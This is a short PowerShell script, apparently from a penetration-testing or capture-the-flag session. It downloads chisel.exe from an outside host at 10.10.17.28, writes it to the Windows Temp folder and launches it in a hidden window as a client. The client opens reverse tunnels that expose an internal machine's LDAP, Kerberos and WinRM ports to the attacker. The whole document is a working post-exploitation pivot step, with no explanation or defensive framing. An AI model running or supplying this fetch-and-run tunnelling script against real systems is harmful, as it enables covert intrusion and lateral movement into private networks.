# Download chisel
Write-Host "Downloading chisel..."
try {
    Invoke-WebRequest -Uri "http://10.10.17.28:8000/chisel.exe" -OutFile "C:\Windows\Temp\ch.exe" -TimeoutSec 30
    Write-Host "Chisel downloaded successfully"
    
    # Test if file exists and is executable
    if (Test-Path "C:\Windows\Temp\ch.exe") {
        Write-Host "Starting chisel client..."
        # Start chisel client with reverse tunnels
        Start-Process -FilePath "C:\Windows\Temp\ch.exe" -ArgumentList "client", "10.10.17.28:4444", "R:33389:192.168.2.2:389", "R:30088:192.168.2.2:88", "R:35985:192.168.2.2:5985" -WindowStyle Hidden
        Write-Host "Chisel client started"
    } else {
        Write-Host "Failed to download chisel"
    }
} catch {
    Write-Host "Error downloading chisel: $($_.Exception.Message)"
}
